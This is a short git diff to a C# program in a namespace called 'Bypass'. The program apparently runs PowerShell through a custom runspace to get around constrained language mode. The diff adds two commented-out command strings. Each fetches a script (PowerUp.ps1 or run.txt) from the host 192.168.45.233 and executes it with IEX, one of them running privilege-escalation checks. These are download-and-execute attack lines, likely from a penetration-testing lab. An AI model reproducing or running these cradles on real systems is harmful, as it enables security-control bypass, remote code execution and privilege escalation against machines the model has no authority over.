@@ -18,6 +18,9 @@ namespace Bypass
         {
 
             String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Windows\\Tasks\\test.txt";
+            // String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.233/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath .\\tc.txt"; //Just Invoke-Allchecks with Powerup and writes a file.
+            // String cmd = "try { (New-Object System.Net.WebClient).DownloadString('http://192.168.45.233/run.txt') | IEX } catch { $_ | Format-List * -Force | Out-String | Out-File -FilePath .\\exc.txt}"; // Downloads run.txt and runs, if catches any exception, writes in to exc.txt.
+            
             Runspace rs = RunspaceFactory.CreateRunspace();
             rs.Open();
             PowerShell ps = PowerShell.Create();
